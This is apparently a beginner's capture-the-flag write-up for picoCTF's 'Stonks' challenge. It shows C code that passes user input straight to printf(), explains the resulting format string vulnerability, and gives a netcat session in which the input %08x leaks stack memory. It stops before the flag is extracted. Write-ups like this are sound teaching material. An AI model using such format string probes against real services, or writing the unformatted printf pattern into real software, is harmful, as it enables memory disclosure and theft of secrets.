# Stonks Write-up

This is my first format string vulnerability CTF task.

## The Challenge

I decided to try something noone else has before. I made a bot to automatically trade stonks for me using AI and machine learning. I wouldn't believe you if you told me it's unsecure! `vuln.c nc` `mercury.picoctf.net 20195`.

## The Solution

We look at the `vuln.c` file. In the `buy_stonks` function, we find a sketchy implementation of the `printf()` function. 
```C
char *user_buf = malloc(300 + 1);
printf("What is your API token?\n");
scanf("%300s", user_buf);
printf("Buying stonks with token:\n");
printf(user_buf);
```
If you know C, then you might have noticed that the formatting argument is missing. This kind of code-implementation of the `printf()` function is a format string vulnerability. As we will see, we can access parts of the stack memory by inputting to <mark>user_buf</mark>, otherwise known as the API token. 

We check if this vulnerability is indeed present by connecting via nc:
```console
(base) stange@ericjoshua ~ % nc mercury.picoctf.net 20195
Welcome back to the trading app!

What would you like to do?
1) Buy some stonks!
2) View my portfolio
1
Using patented AI algorithms to buy stonks
Stonks chosen
What is your API token?
%08x
Buying stonks with token:
082c0430
```
The input `%08x` specifies to the `printf()` function to print 8 hexadecimal digits from the stack. To find the flag, we will continue to look into `vuln.c`. The following code block is interesting:
```C
char api_buf[FLAG_BUFFER];
FILE *f = fopen("api","r");
if (!f) {
	printf("Flag file not found. Contact an admin.\n");
	exit(1);
}
fgets(api_buf, FLAG_BUFFER, f);
```



